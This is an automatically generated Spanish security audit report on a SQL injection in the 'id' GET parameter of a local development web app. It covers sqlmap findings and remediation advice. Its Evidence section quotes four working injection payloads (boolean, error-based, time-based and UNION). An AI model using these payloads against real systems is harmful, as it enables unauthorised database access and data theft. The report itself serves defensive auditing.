# Informe de análisis: SQL Injection

- Fecha (UTC): 2026-04-27T10:09:03Z
- Objetivo: http://web.dev.local:8083
- Herramienta principal: sqlmap (escaneo automático de formularios y parámetros GET)

Resumen
-------
sqlmap detectó y explotó una vulnerabilidad de SQL Injection en el parámetro GET "id" de la URL raíz.

Hallazgos
--------
- Parámetro vulnerable: id (GET)
- Técnicas detectadas: OR boolean-based blind, error-based (MySQL FLOOR-based), time-based blind (SLEEP), UNION-based (2 columnas)
- DBMS identificado: MySQL (MariaDB fork)
- Servidor web/stack: Apache 2.4.65, PHP 8.1.33, OS: Linux (Debian)

Evidencia (payloads usados por sqlmap)
-------------------------------------
- Boolean-based (ejemplo): id=4153' OR NOT 6008=6008-- KHZI&Submit=Submit
- Error-based (ejemplo): id=4153' OR (SELECT 9928 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(9928=9928,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aUPR&Submit=Submit
- Time-based (ejemplo): id=4153' AND (SELECT 6369 FROM (SELECT(SLEEP(5)))lKPY)-- nHYh&Submit=Submit
- UNION (ejemplo): id=4153' UNION ALL SELECT CONCAT(0x7178717671,0x686a79514a4a4967666c6c4b7769736a77536b597869554e6e56704754587648705a65445a7a6e46,0x717a6b6271),NULL-- -&Submit=Submit

Resultados adicionales
----------------------
- sqlmap reportó que el parámetro `id` es vulnerable y permitió fingerprint del DBMS y técnicas de extracción.
- Archivo CSV de salida (sqlmap): /home/kali_rdp/.local/share/sqlmap/output/results-04272026_1209pm.csv

Impacto
-------
Un atacante podría obtener información de la base de datos, enumerar tablas/columnas y, potencialmente, extraer datos sensibles o alterar consultas según privilegios del usuario de BD.

Recomendaciones
---------------
1. Usar consultas parametrizadas (prepared statements) para todas las consultas SQL que reciban datos del usuario.
2. Validar y normalizar entradas del usuario (whitelist) y limitar la longitud/formatos esperados.
3. Aplicar principio de menor privilegio a la cuenta usada por la aplicación para conectarse a la BD.
4. Evitar mostrar errores SQL completos al usuario; registrar internamente y mostrar mensajes genéricos.
5. Implementar WAF reglas temporales para bloquear payloads detectados mientras se corrige el código.

Conclusión
----------
La aplicación en http://web.dev.local:8083 es vulnerable a SQL Injection en el parámetro GET `id` y la vulnerabilidad fue verificada y parcialmente explotada por sqlmap (fingerprint y técnicas de extracción).

-- Informe generado automáticamente por herramientas de auditoría (sqlmap).